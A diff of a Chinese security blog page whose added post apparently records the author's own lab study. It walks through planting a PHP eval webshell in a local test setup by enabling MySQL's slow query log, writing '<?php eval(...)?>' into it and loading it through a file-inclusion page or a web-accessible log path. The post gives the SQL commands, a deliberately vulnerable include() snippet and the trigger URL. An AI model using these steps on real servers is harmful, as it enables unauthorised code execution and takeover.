@@ -27,14 +27,12 @@
   <meta name="keywords" content="java,git,springcloud" />
 
 
-<link rel="canonical" href="https://hq185187.github.io/archives/2023/05/">
+<link rel="canonical" href="https://hq185187.github.io/2023/07/06/%E6%85%A2%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/">
 
 
 
   <title>
-2023 年 / 05 月 -
-
-归档 |
+时间盲注 - SQL注入 |
 不良人天藏星 = welcome to my blog = 不良人总舵</title>
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -62,9 +60,34 @@
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">
-      发表于"2023年05月"的文章
+  <h1 itemprop="name headline">时间盲注
   </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-07-06 16:43:36">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-07-06T16:43:36+08:00">2023-07-06</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>746</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>1 分钟</span>
+  </span>
+</div>
+
 
           </div>
         </div>
@@ -93,14 +116,7 @@
 
       </div>
       <div id="imgs" class="pjax">
-        <ul>
-          <li class="item" data-background-image="https://s2.loli.net/2023/06/06/1t6Tg5lRBYXjubn.webp"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/06/06/EeKAC2L5ohd6Yxq.png"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/06/06/951AHbfr3jklYQI.png"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/06/06/vnNKEzfpqAhm5aH.webp"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/06/06/EdPaOkDJZVbLKt9.webp"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/06/06/BZE9tSe8bRuVmq4.png"></li>
-        </ul>
+          <img src="/assets/9.jpg">
       </div>
     </header>
     <div id="waves">
@@ -120,150 +136,115 @@
       <div class="inner">
         <div id="main" class="pjax">
           
-  <div class="collapse wrap">
-    <h2 class="item header">
-          <a href="/archives">全部</a> <small>/</small> <a href="/archives/2023">2023 年</a> <small>/</small> 05 月<small>归档</small>
-        
-    </h2>
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/sql/" itemprop="item" rel="index" title="分类于 SQL注入"><span itemprop="name">SQL注入</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
 
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2023-05-14T20:20:25+08:00"
-                  content="2023-05-14">
-              05-14
-            </time>
-          </div>
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://hq185187.github.io/2023/07/06/%E6%85%A2%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/">
 
-          <div class="title">
-              <a href="/2023/05/14/LitCTF2023/" itemprop="url">
-                <span itemprop="name">LitCTF2023</span>
-              </a>
-          </div>
-        </article>
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="hq185187">
+    <meta itemprop="description" content="不良人总舵, 不定时更新web安全相关知识">
+  </span>
 
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2023-05-12T16:31:39+08:00"
-                  content="2023-05-12">
-              05-12
-            </time>
-                <span><a href="/categories/NSSCTF/">NSSCTF精选</a></span>
-          </div>
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="welcome to my blog">
+  </span>
 
-          <div class="title">
-              <a href="/2023/05/12/nssctf2/" itemprop="url">
-                <span itemprop="name">NSSCTF2</span>
-              </a>
-          </div>
-        </article>
+  <div class="body md" itemprop="articleBody">
+    
 
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2023-05-12T16:09:54+08:00"
-                  content="2023-05-12">
-              05-12
-            </time>
-          </div>
+    <p>先本地连接 MySQL:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql.exe -u root -p</span><br><span class="line">输入密码</span><br></pre></td></tr></table></figure>
+<p>当查询语句的时间超过系统默认的时间时，该语句会被记入慢查询日志。一般都是通过 long_query_time 选项设置，以秒为单位。查看默认的时间：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%long_query_time%&#x27;;</span><br></pre></td></tr></table></figure>
+<p>我这里是 10s</p>
+<p>开启慢查询:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log=1;</span><br></pre></td></tr></table></figure>
+<p>查看参数:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES like &#x27;%slow_query_log%&#x27;;</span><br></pre></td></tr></table></figure>
+<p>此时如果有文件包含的点，我们可以 getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line"></span><br><span class="line">$b=include($a);</span><br><span class="line"></span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure>
+<p>在 MySQL 命令行中，向日志文件写入 shell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_GET[X])?&gt;&#x27; or sleep(11);</span><br></pre></td></tr></table></figure>
+<p>直接 getshell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/webtest/1.php?a=D:\phpstudy_pro\Extensions\MySQL5.7.26\data\laptop-slow.log&amp;X=phpinfo();</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://s2.loli.net/2023/07/06/Zs6HIdUKg2VFB8r.png" alt="屏幕截图 2023-07-06 162417.png"></p>
+<p>就算没有文件包含的点，我们也可以 getshell<br>
+ 将日志文件位置改为能访问的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL slow_query_log_file=&#x27;D:\phpstudy_pro\WWW\shell.php&#x27;;</span><br></pre></td></tr></table></figure>
+<p>此时在 MySQL 命令行添加 shell 日志<br>
+ <code>select '&lt;?php eval($_GET[shell])?&gt;' or sleep(11);</code> <br>
+ 直接可以在 shell.php 里面 getshell</p>
 
-          <div class="title">
-              <a href="/2023/05/12/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" itemprop="url">
-                <span itemprop="name">沙箱逃逸初学习</span>
-              </a>
-          </div>
-        </article>
-
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2023-05-10T23:07:02+08:00"
-                  content="2023-05-10">
-              05-10
-            </time>
-          </div>
-
-          <div class="title">
-              <a href="/2023/05/10/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" itemprop="url">
-                <span itemprop="name">原型链污染</span>
-              </a>
-          </div>
-        </article>
-
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2023-05-07T15:33:27+08:00"
-                  content="2023-05-07">
-              05-07
-            </time>
-                <span><a href="/categories/sql/">SQL注入</a></span>
-          </div>
-
-          <div class="title">
-              <a href="/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" itemprop="url">
-                <span itemprop="name">时间盲注</span>
-              </a>
-          </div>
-        </article>
-
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2023-05-03T14:54:19+08:00"
-                  content="2023-05-03">
-              05-03
-            </time>
-          </div>
-
-          <div class="title">
-              <a href="/2023/05/03/request%E5%BA%93/" itemprop="url">
-                <span itemprop="name">requests学习</span>
-              </a>
-          </div>
-        </article>
-
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2023-05-02T12:25:19+08:00"
-                  content="2023-05-02">
-              05-02
-            </time>
-          </div>
-
-          <div class="title">
-              <a href="/2023/05/02/ssti-labs/" itemprop="url">
-                <span itemprop="name">SSTI-Labs</span>
-              </a>
-          </div>
-        </article>
-
-        <article class="item normal" itemscope itemtype="http://schema.org/Article">
-          <div class="meta">
-            <time itemprop="dateCreated"
-                  datetime="2023-05-02T10:48:11+08:00"
-                  content="2023-05-02">
-              05-02
-            </time>
-          </div>
-
-          <div class="title">
-              <a href="/2023/05/02/SSTI/" itemprop="url">
-                <span itemprop="name">SSTI总结</span>
-              </a>
-          </div>
-        </article>
   </div>
 
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-07-06 16:44:40" itemprop="dateModified" datetime="2023-07-06T16:44:40+08:00">2023-07-06</time>
+  </span>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>hq185187 <i class="ic i-at"><em>@</em></i>welcome to my blog
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://hq185187.github.io/2023/07/06/%E6%85%A2%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/" title="时间盲注">https://hq185187.github.io/2023/07/06/慢日志注入/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
   
 
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/07/06/xxe%E6%B3%A8%E5%85%A5/" itemprop="url" rel="prev" data-background-image="&#x2F;assets&#x2F;3.png" title="XXE注入">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>XXE注入</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
 
 
         </div>
         <div id="sidebar">
           
+
 <div class="inner">
 
   <div class="panels">
@@ -271,6 +252,9 @@
       <div class="contents panel pjax" data-title="文章目录">
       </div>
       <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2023/04/28/sqli-labs/" rel="bookmark" title="Sqli-labs靶场通关">Sqli-labs靶场通关</a></li><li><a href="/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/" rel="bookmark" title="SQL注入绕过">SQL注入绕过</a></li><li><a href="/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" rel="bookmark" title="时间盲注">时间盲注</a></li><li><a href="/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/" rel="bookmark" title="Mysql主从复制">Mysql主从复制</a></li><li><a href="/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" rel="bookmark" title="宽字节注入学习">宽字节注入学习</a></li><li class="active"><a href="/2023/07/06/%E6%85%A2%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/" rel="bookmark" title="时间盲注">时间盲注</a></li>
+        </ul>
       </div>
       <div class="overview panel" data-title="站点概览">
         <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -350,6 +334,7 @@
   </ul>
 </div>
 
+
         </div>
         <div class="dimmer"></div>
       </div>
@@ -365,29 +350,9 @@
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/sql/" title="分类于 SQL注入">SQL注入</a>
 </div>
 
-    <span><a href="/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/" title="Mysql主从复制">Mysql主从复制</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/04/30/md5/" title="MD5绕过总结">MD5绕过总结</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/sql/" title="分类于 SQL注入">SQL注入</a>
-</div>
-
-    <span><a href="/2023/07/06/%E6%85%A2%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/" title="时间盲注">时间盲注</a></span>
+    <span><a href="/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="命令执行漏洞及绕过方法">命令执行漏洞及绕过方法</a></span>
   </li>
 
       
@@ -405,7 +370,16 @@
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/07/01/session%E5%AE%89%E5%85%A8/" title="session安全">session安全</a></span>
+    <span><a href="/2023/05/12/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="沙箱逃逸初学习">沙箱逃逸初学习</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="正则表达式">正则表达式</a></span>
   </li>
 
       
@@ -415,7 +389,7 @@
 <a href="/categories/sql/" title="分类于 SQL注入">SQL注入</a>
 </div>
 
-    <span><a href="/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/" title="SQL注入绕过">SQL注入绕过</a></span>
+    <span><a href="/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/" title="时间盲注">时间盲注</a></span>
   </li>
 
       
@@ -424,7 +398,7 @@
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/06/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Phar反序列化学习">Phar反序列化学习</a></span>
+    <span><a href="/2023/07/06/XML%E5%9F%BA%E7%A1%80/" title="XML基础知识">XML基础知识</a></span>
   </li>
 
       
@@ -433,7 +407,16 @@
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/" title="无字母数字rce">无字母数字rce</a></span>
+    <span><a href="/2023/07/06/xxe%E6%B3%A8%E5%85%A5/" title="XXE注入">XXE注入</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/06/29/CRLF/" title="CRLF学习">CRLF学习</a></span>
   </li>
 
       
@@ -453,7 +436,7 @@
 <a href="/categories/NSSCTF/" title="分类于 NSSCTF精选">NSSCTF精选</a>
 </div>
 
-    <span><a href="/2023/05/12/nssctf2/" title="NSSCTF2">NSSCTF2</a></span>
+    <span><a href="/2023/06/04/nssctf3/" title="NSSCTF3">NSSCTF3</a></span>
   </li>
 
   </ul>
@@ -496,7 +479,7 @@
   </div>
 <script data-config type="text/javascript">
   var LOCAL = {
-    path: 'archives/2023/05/',
+    path: '2023/07/06/慢日志注入/',
     favicon: {
       show: "（●´3｀●）やれやれだぜ",
       hide: "(´Д｀)大変だ！"
